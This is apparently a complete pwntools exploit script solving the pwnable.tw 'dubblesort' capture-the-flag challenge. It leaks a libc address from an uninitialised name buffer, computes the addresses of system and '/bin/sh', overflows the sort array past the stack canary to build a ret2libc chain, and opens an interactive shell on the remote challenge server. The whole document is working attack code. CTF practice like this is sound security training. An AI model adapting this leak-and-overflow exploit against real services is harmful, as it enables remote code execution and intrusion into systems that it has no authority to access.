from pwn import *
context(log_level='DEBUG')
DEBUG=0

e = ELF('./libc_32.so.6')

if DEBUG==1: #debug
	s = process('./dubblesort')#,env={'LD_PRELOAD':'/libc_32.so.6'})
	raw_input()
	offset_got_plt= 0x1b2000
	system_offset = 0x3ada0
	binsh_offset = 0x15ba0b
	numofnum=42
else: #server
	s = remote('chall.pwnable.tw', 10101)
	system_offset = e.symbols['system']
	binsh_offset = e.search('/bin/sh\x00').next()
	offset_got_plt=0x1b0000
	numofnum=43

s.sendlineafter('What your name :','a'*23+'b')
s.recvuntil('b')

got_plt = u32(s.recv(4))-0x0a
libc_base = got_plt-offset_got_plt
system_libc = libc_base+system_offset
binsh_libc = libc_base+binsh_offset

log.info("system_offset:0x%x"%system_offset)
log.info('system: 0x%x'%system_libc)
log.info('binsh: 0x%x'%binsh_libc)

log.info('got_add: 0x%x'%got_plt)
log.info('libc_base: 0x%x'%libc_base)

s.sendlineafter('How many numbers do you what to sort',str(numofnum))
for i in range(15):
	s.sendlineafter('number :','0')
s.sendlineafter('Enter the 15 number :',str(system_libc-2))
s.sendlineafter('Enter the 16 number :',str(system_libc-2))
s.sendlineafter('Enter the 17 number :',str(system_libc-2))
s.sendlineafter('Enter the 18 number :',str(system_libc-2))
s.sendlineafter('Enter the 19 number :',str(system_libc-2))
s.sendlineafter('Enter the 20 number :',str(system_libc-2))
s.sendlineafter('Enter the 21 number :',str(system_libc+1))
s.sendlineafter('Enter the 22 number :',str(system_libc))
s.sendlineafter('Enter the 23 number :',str(binsh_libc))
s.sendlineafter('Enter the 24 number :','a')
s.interactive()
s.close()